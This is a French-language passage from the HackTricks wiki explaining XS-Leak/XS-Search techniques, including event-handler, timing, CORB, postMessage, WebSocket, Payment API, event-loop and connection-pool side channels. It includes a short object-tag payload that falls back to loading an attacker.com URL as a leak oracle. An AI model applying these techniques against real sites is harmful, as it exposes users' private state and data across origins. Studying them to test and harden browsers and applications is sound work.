# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Informations de base

XS-Search est une m√©thode utilis√©e pour **extraire des informations cross-origin** en exploitant des **vuln√©rabilit√©s de canal auxiliaire**.

Les composants cl√©s impliqu√©s dans cette attaque comprennent :

* **Web vuln√©rable** : Le site web cible √† partir duquel les informations doivent √™tre extraites.
* **Web de l'attaquant** : Le site web malveillant cr√©√© par l'attaquant, que la victime visite, h√©bergeant l'exploit.
* **M√©thode d'inclusion** : La technique employ√©e pour incorporer le Web vuln√©rable dans le Web de l'attaquant (par exemple, window.open, iframe, fetch, balise HTML avec href, etc.).
* **Technique de fuite** : Techniques utilis√©es pour discerner les diff√©rences dans l'√©tat du Web vuln√©rable en fonction des informations recueillies par la m√©thode d'inclusion.
* **√âtats** : Les deux conditions potentielles du Web vuln√©rable, que l'attaquant vise √† distinguer.
* **Diff√©rences d√©tectables** : Variations observables sur lesquelles l'attaquant s'appuie pour inf√©rer l'√©tat du Web vuln√©rable.

### Diff√©rences d√©tectables

Plusieurs aspects peuvent √™tre analys√©s pour diff√©rencier les √©tats du Web vuln√©rable :

* **Code d'√©tat** : Distinguer entre **divers codes d'√©tat de r√©ponse HTTP** cross-origin, comme les erreurs serveur, les erreurs client ou les erreurs d'authentification.
* **Utilisation de l'API** : Identifier **l'utilisation des API Web** √† travers les pages, r√©v√©lant si une page cross-origin utilise une API Web JavaScript sp√©cifique.
* **Redirections** : D√©tecter les navigations vers diff√©rentes pages, pas seulement les redirections HTTP mais aussi celles d√©clench√©es par JavaScript ou HTML.
* **Contenu de la page** : Observer **les variations dans le corps de la r√©ponse HTTP** ou dans les sous-ressources de la page, telles que le **nombre de cadres int√©gr√©s** ou les disparit√©s de taille dans les images.
* **En-t√™te HTTP** : Noter la pr√©sence ou √©ventuellement la valeur d'un **en-t√™te de r√©ponse HTTP sp√©cifique**, y compris des en-t√™tes comme X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
* **Temps** : Remarquer des disparit√©s de temps coh√©rentes entre les deux √©tats.

### M√©thodes d'inclusion

* **√âl√©ments HTML** : HTML offre divers √©l√©ments pour **l'inclusion de ressources cross-origin**, comme des feuilles de style, des images ou des scripts, obligeant le navigateur √† demander une ressource non-HTML. Une compilation des √©l√©ments HTML potentiels √† cet effet peut √™tre trouv√©e sur [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Cadres** : Des √©l√©ments tels que **iframe**, **object** et **embed** peuvent int√©grer des ressources HTML directement dans la page de l'attaquant. Si la page **manque de protection contre le framing**, JavaScript peut acc√©der √† l'objet window de la ressource encadr√©e via la propri√©t√© contentWindow.
* **Pop-ups** : La m√©thode **`window.open`** ouvre une ressource dans un nouvel onglet ou une nouvelle fen√™tre, fournissant un **handle de fen√™tre** pour que JavaScript interagisse avec des m√©thodes et des propri√©t√©s suivant le SOP. Les pop-ups, souvent utilis√©es dans le cadre de l'authentification unique, contournent les restrictions de framing et de cookies d'une ressource cible. Cependant, les navigateurs modernes restreignent la cr√©ation de pop-ups √† certaines actions de l'utilisateur.
* **Requ√™tes JavaScript** : JavaScript permet des requ√™tes directes vers des ressources cibles en utilisant **XMLHttpRequests** ou l'**API Fetch**. Ces m√©thodes offrent un contr√¥le pr√©cis sur la requ√™te, comme choisir de suivre les redirections HTTP.

### Techniques de fuite

* **Gestionnaire d'√©v√©nements** : Une technique de fuite classique dans les XS-Leaks, o√π des gestionnaires d'√©v√©nements comme **onload** et **onerror** fournissent des informations sur le succ√®s ou l'√©chec du chargement des ressources.
* **Messages d'erreur** : Les exceptions JavaScript ou les pages d'erreur sp√©ciales peuvent fournir des informations de fuite soit directement √† partir du message d'erreur, soit en diff√©renciant sa pr√©sence et son absence.
* **Limites globales** : Les limitations physiques d'un navigateur, comme la capacit√© m√©moire ou d'autres limites impos√©es par le navigateur, peuvent signaler lorsqu'un seuil est atteint, servant de technique de fuite.
* **√âtat global** : Les interactions d√©tectables avec les **√©tats globaux** des navigateurs (par exemple, l'interface History) peuvent √™tre exploit√©es. Par exemple, le **nombre d'entr√©es** dans l'historique d'un navigateur peut offrir des indices sur les pages cross-origin.
* **API de performance** : Cette API fournit des **d√©tails de performance de la page actuelle**, y compris le timing r√©seau pour le document et les ressources charg√©es, permettant d'inf√©rer sur les ressources demand√©es.
* **Attributs lisibles** : Certains attributs HTML sont **lisibles cross-origin** et peuvent √™tre utilis√©s comme technique de fuite. Par exemple, la propri√©t√© `window.frame.length` permet √† JavaScript de compter les cadres inclus dans une page web cross-origin.

## Outil et papier XSinator

XSinator est un outil automatique pour **v√©rifier les navigateurs contre plusieurs XS-Leaks connus** expliqu√©s dans son papier : [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Vous pouvez **acc√©der √† l'outil sur** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks exclus** : Nous avons d√ª exclure les XS-Leaks qui reposent sur des **workers de service** car ils interf√®reraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui reposent sur des erreurs de configuration et des bugs dans une application web sp√©cifique**. Par exemple, les erreurs de configuration CrossOrigin Resource Sharing (CORS), les fuites postMessage ou le Cross-Site Scripting. De plus, nous avons exclu les XS-Leaks bas√©s sur le temps car ils souffrent souvent d'√™tre lents, bruyants et inexactes.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Techniques bas√©es sur le temps**

Certaines des techniques suivantes vont utiliser le temps comme partie du processus pour d√©tecter les diff√©rences dans les √©tats possibles des pages web. Il existe diff√©rentes mani√®res de mesurer le temps dans un navigateur web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux d√©veloppeurs d'obtenir des mesures de temps √† haute r√©solution.\
Il existe un nombre consid√©rable d'APIs que les attaquants peuvent abuser pour cr√©er des horloges implicites : [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animations CSS, et d'autres.\
Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniques de gestionnaire d'√©v√©nements

### Onload/Onerror

* **M√©thodes d'inclusion** : Cadres, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'infos** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **R√©sum√©** : si l'on essaie de charger une ressource, les √©v√©nements onerror/onload sont d√©clench√©s lorsque la ressource est charg√©e avec succ√®s/√©chec, il est possible de d√©terminer le code d'√©tat.
* **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'exemple de code essaie de **charger des objets de scripts depuis JS**, mais **d'autres balises** telles que des objets, des feuilles de style, des images, des audios pourraient √©galement √™tre utilis√©es. De plus, il est √©galement possible d'injecter la **balise directement** et de d√©clarer les √©v√©nements `onload` et `onerror` √† l'int√©rieur de la balise (au lieu de l'injecter depuis JS).

Il existe √©galement une version sans script de cette attaque :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouv√©, `attacker.com/?error` sera charg√©.

### Onload Timing

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** L'API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, comme l'[**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.**
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans :

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** va √©galement **forcer** une action pour prendre une **dur√©e pertinente** lorsque la **r√©ponse est positive ou n√©gative** et mesurer ce temps.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Cadres
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Le temps n√©cessaire pour r√©cup√©rer une ressource peut √™tre mesur√© en utilisant les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). L'√©v√©nement **`beforeunload`** est d√©clench√© lorsque le navigateur est sur le point de naviguer vers une nouvelle page, tandis que l'√©v√©nement **`unload`** se produit lorsque la navigation a effectivement lieu. La diff√©rence de temps entre ces deux √©v√©nements peut √™tre calcul√©e pour d√©terminer la **dur√©e que le navigateur a pass√©e √† r√©cup√©rer la ressource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Cadres
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Il a √©t√© observ√© qu'en l'absence de [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), le temps n√©cessaire pour qu'une page et ses sous-ressources se chargent sur le r√©seau peut √™tre mesur√© par un attaquant. Cette mesure est g√©n√©ralement possible car le gestionnaire `onload` d'un iframe est d√©clench√© uniquement apr√®s l'ach√®vement du chargement des ressources et de l'ex√©cution de JavaScript. Pour contourner la variabilit√© introduite par l'ex√©cution de scripts, un attaquant pourrait utiliser l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans le `<iframe>`. L'inclusion de cet attribut restreint de nombreuses fonctionnalit√©s, notamment l'ex√©cution de JavaScript, facilitant ainsi une mesure qui est principalement influenc√©e par la performance du r√©seau.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**:
* **Summary**: Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est acc√©d√© et la faire charger correctement lorsque n'importe quel contenu est acc√©d√©, alors vous pouvez cr√©er une boucle pour extraire toutes les informations sans mesurer le temps.
* **Code Example**:

Supposons que vous puissiez **ins√©rer** la **page** qui contient le **contenu secret** **dans un Iframe**.

Vous pouvez **faire rechercher √† la victime** le fichier qui contient "_**flag**_" en utilisant un **Iframe** (exploiter un CSRF par exemple). √Ä l'int√©rieur de l'Iframe, vous savez que l'_**√©v√©nement onload**_ sera **ex√©cut√© toujours au moins une fois**. Ensuite, vous pouvez **changer** l'**URL** de l'**iframe** mais en changeant uniquement le **contenu** du **hash** √† l'int√©rieur de l'URL.

Par exemple :

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la premi√®re URL a √©t√© **charg√©e avec succ√®s**, alors, lorsque vous **changez** la partie **hash** de l'URL, l'**√©v√©nement onload** **ne sera pas d√©clench√©** √† nouveau. Mais **si** la page avait une sorte d'**erreur** lors du **chargement**, alors, l'**√©v√©nement onload** sera **d√©clench√© √† nouveau**.

Ensuite, vous pouvez **distinguer entre** une page **charg√©e correctement** ou une page qui a une **erreur** lorsqu'elle est acc√©d√©e.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**:
* **Summary:** Si la **page** renvoie le **contenu sensible**, **ou** un **contenu** qui peut √™tre **contr√¥l√©** par l'utilisateur. L'utilisateur pourrait d√©finir **un code JS valide dans le cas n√©gatif**, un **chargement** √† chaque essai √† l'int√©rieur des **`<script>`** tags, donc dans les cas **n√©gatifs**, le **code** des attaquants est **ex√©cut√©**, et dans les cas **affirmatifs**, **rien** ne sera ex√©cut√©.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat & En-t√™tes
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** est une mesure de s√©curit√© qui emp√™che les pages web de charger certaines ressources sensibles d'origine crois√©e pour se prot√©ger contre des attaques comme **Spectre**. Cependant, les attaquants peuvent exploiter son comportement protecteur. Lorsqu'une r√©ponse soumise √† **CORB** renvoie un `Content-Type` _**prot√©g√© par CORB**_ avec `nosniff` et un code d'√©tat `2xx`, **CORB** supprime le corps et les en-t√™tes de la r√©ponse. Les attaquants observant cela peuvent d√©duire la combinaison du **code d'√©tat** (indiquant le succ√®s ou l'erreur) et du `Content-Type` (indiquant s'il est prot√©g√© par **CORB**), ce qui peut entra√Æner une fuite d'informations potentielle.
* **Code Example**:

V√©rifiez le lien d'informations suppl√©mentaires pour plus d'informations sur l'attaque.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Fuite de donn√©es sensibles √† partir de l'attribut id ou name.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** √† l'int√©rieur d'un **iframe** et d'utiliser le **`#id_value`** pour faire **focaliser la page sur l'√©l√©ment** de l'iframe avec l'id indiqu√©, puis si un signal **`onblur`** est d√©clench√©, l'√©l√©ment ID existe.\
Vous pouvez effectuer la m√™me attaque avec des tags **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Rassembler des informations sensibles √† partir d'un postMessage ou utiliser la pr√©sence de postMessages comme un oracle pour conna√Ætre l'√©tat de l'utilisateur sur la page
* **Code Example**: `Tout code √©coutant tous les postMessages.`

Les applications utilisent fr√©quemment les [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) pour communiquer entre diff√©rentes origines. Cependant, cette m√©thode peut involontairement exposer des **informations sensibles** si le param√®tre `targetOrigin` n'est pas correctement sp√©cifi√©, permettant √† n'importe quelle fen√™tre de recevoir les messages. De plus, le simple fait de recevoir un message peut agir comme un **oracle** ; par exemple, certains messages peuvent n'√™tre envoy√©s qu'aux utilisateurs qui sont connect√©s. Par cons√©quent, la pr√©sence ou l'absence de ces messages peut r√©v√©ler des informations sur l'√©tat ou l'identit√© de l'utilisateur, comme s'il est authentifi√© ou non.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniques de Limites Globales

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: √âpuiser la limite de connexion WebSocket r√©v√®le le nombre de connexions WebSocket d'une page d'origine crois√©e.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Il est possible d'identifier si, et combien, de **connexions WebSocket une page cible utilise**. Cela permet √† un attaquant de d√©tecter les √©tats de l'application et de r√©v√©ler des informations li√©es au nombre de connexions WebSocket.

Si une **origine** utilise le **nombre maximum d'objets de connexion WebSocket**, ind√©pendamment de l'√©tat de leurs connexions, la cr√©ation de **nouveaux objets entra√Ænera des exceptions JavaScript**. Pour ex√©cuter cette attaque, le site de l'attaquant ouvre le site cible dans une fen√™tre pop-up ou un iframe et ensuite, apr√®s que le site web cible a √©t√© charg√©, tente de cr√©er le maximum de connexions WebSocket possible. Le **nombre d'exceptions lev√©es** est le **nombre de connexions WebSocket utilis√©es par la fen√™tre du site web cible**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: D√©tecter la demande de paiement car une seule peut √™tre active √† la fois.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Cette fuite XS permet √† un attaquant de **d√©tecter quand une page d'origine crois√©e initie une demande de paiement**.

Parce que **une seule demande de paiement peut √™tre active** √† la fois, si le site cible utilise l'API de demande de paiement, toute nouvelle tentative d'utiliser cette API √©chouera et provoquera une **exception JavaScript**. L'attaquant peut exploiter cela en **tentant p√©riodiquement d'afficher l'interface utilisateur de l'API de paiement**. Si une tentative provoque une exception, le site cible l'utilise actuellement. L'attaquant peut cacher ces tentatives p√©riodiques en fermant imm√©diatement l'interface utilisateur apr√®s sa cr√©ation.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Mesurer le temps d'ex√©cution d'un web en abusant de la boucle d'√©v√©nements JS √† thread unique.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript fonctionne sur un mod√®le de concurrence de [boucle d'√©v√©nements √† thread unique](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), signifiant qu'il **ne peut ex√©cuter qu'une seule t√¢che √† la fois**. Cette caract√©ristique peut √™tre exploit√©e pour √©valuer **combien de temps le code d'une autre origine prend pour s'ex√©cuter**. Un attaquant peut mesurer le temps d'ex√©cution de son propre code dans la boucle d'√©v√©nements en envoyant continuellement des √©v√©nements avec des propri√©t√©s fixes. Ces √©v√©nements seront trait√©s lorsque le pool d'√©v√©nements est vide. Si d'autres origines envoient √©galement des √©v√©nements au m√™me pool, un **attaquant peut d√©duire le temps qu'il faut pour que ces √©v√©nements externes s'ex√©cutent en observant les retards dans l'ex√©cution de ses propres t√¢ches**. Cette m√©thode de surveillance de la boucle d'√©v√©nements pour des retards peut r√©v√©ler le temps d'ex√©cution du code provenant de diff√©rentes origines, exposant potentiellement des informations sensibles.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Une m√©thode pour mesurer le temps d'ex√©cution d'une op√©ration web consiste √† bloquer intentionnellement la boucle d'√©v√©nements d'un thread et ensuite √† chronom√©trer **combien de temps il faut pour que la boucle d'√©v√©nements redevienne disponible**. En ins√©rant une op√©ration de blocage (comme un long calcul ou un appel d'API synchrone) dans la boucle d'√©v√©nements, et en surveillant le temps qu'il faut pour que le code suivant commence √† s'ex√©cuter, on peut d√©duire la dur√©e des t√¢ches qui s'ex√©cutaient dans la boucle d'√©v√©nements pendant la p√©riode de blocage. Cette technique exploite la nature √† thread unique de la boucle d'√©v√©nements de JavaScript, o√π les t√¢ches sont ex√©cut√©es s√©quentiellement, et peut fournir des informations sur la performance ou le comportement d'autres op√©rations partageant le m√™me thread.
* **Code Example**:

Un avantage significatif de la technique de mesure du temps d'ex√©cution en verrouillant la boucle d'√©v√©nements est son potentiel √† contourner **l'Isolation de Site**. **L'Isolation de Site** est une fonctionnalit√© de s√©curit√© qui s√©pare diff√©rents sites web en processus distincts, visant √† emp√™cher les sites malveillants d'acc√©der directement aux donn√©es sensibles d'autres sites. Cependant, en influen√ßant le timing d'ex√©cution d'une autre origine par le biais de la boucle d'√©v√©nements partag√©e, un attaquant peut indirectement extraire des informations sur les activit√©s de cette origine. Cette m√©thode ne repose pas sur un acc√®s direct aux donn√©es de l'autre origine mais plut√¥t sur l'observation de l'impact des activit√©s de cette origine sur la boucle d'√©v√©nements partag√©e, contournant ainsi les barri√®res de protection √©tablies par **l'Isolation de Site**.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: Requ√™tes JavaScript
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Un attaquant pourrait verrouiller toutes les sockets sauf 1, charger le web cible et en m√™me temps charger une autre page, le temps jusqu'√† ce que la derni√®re page commence √† se charger est le temps que la page cible a mis √† se charger.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Les navigateurs utilisent des sockets pour la communication avec le serveur, mais en raison des ressources limit√©es du syst√®me d'exploitation et du mat√©riel, **les navigateurs sont contraints d'imposer une limite** sur le nombre de sockets simultan√©s. Les attaquants peuvent exploiter cette limitation par les √©tapes suivantes :

1. D√©terminer la limite de sockets du navigateur, par exemple, 256 sockets globales.
2. Occuper 255 sockets pendant une dur√©e prolong√©e en initiant 255 requ√™tes vers divers h√¥tes, con√ßues pour maintenir les connexions ouvertes sans les terminer.
3. Utiliser le 256√®me socket pour envoyer une requ√™te √† la page cible.
4. Tenter une 257√®me requ√™te vers un autre h√¥te. √âtant donn√© que tous les sockets sont utilis√©s (comme indiqu√© aux √©tapes 2 et 3), cette requ√™te sera mise en file d'attente jusqu'√† ce qu'un socket devienne disponible. Le d√©lai avant que cette requ√™te ne progresse fournit √† l'attaquant des informations de timing sur l'activit√© r√©seau li√©e au socket du 256√®me (le socket de la page cible). Cette d√©duction est possible car les 255 sockets de l'√©tape 2 sont toujours engag√©s, ce qui implique que tout nouveau socket disponible doit √™tre celui lib√©r√© par l'√©tape 3. Le temps n√©cessaire pour que le 256√®me socket devienne disponible est donc directement li√© au temps requis pour que la requ√™te √† la page cible se termine.

Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: Requ√™tes JavaScript
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**:
* **Summary:** C'est comme la technique pr√©c√©dente mais au lieu d'utiliser tous les sockets, Google **Chrome** impose une limite de **6 requ√™tes simultan√©es √† la m√™me origine**. Si nous **bloquons 5** et ensuite **lan√ßons une 6√®me** requ√™te, nous pouvons **chronom√©trer** et si nous avons r√©ussi √† faire en sorte que la **page victime envoie** plus de **requ√™tes** vers le m√™me point de terminaison pour d√©tecter un **statut** de la **page**, la **6√®me requ√™te** prendra **plus de temps** et nous pouvons le d√©tecter.

## Techniques de l'API de Performance

L'[`API de Performance`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offre des aper√ßus sur les m√©triques de performance des applications web, enrichies par l'[`API de Timing des Ressources`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). L'API de Timing des Ressources permet de surveiller les temps de requ√™tes r√©seau d√©taill√©s, tels que la dur√©e des requ√™tes. Notamment, lorsque les serveurs incluent l'en-t√™te `Timing-Allow-Origin: *` dans leurs r√©ponses, des donn√©es suppl√©mentaires comme la taille de transfert et le temps de recherche de domaine deviennent disponibles.

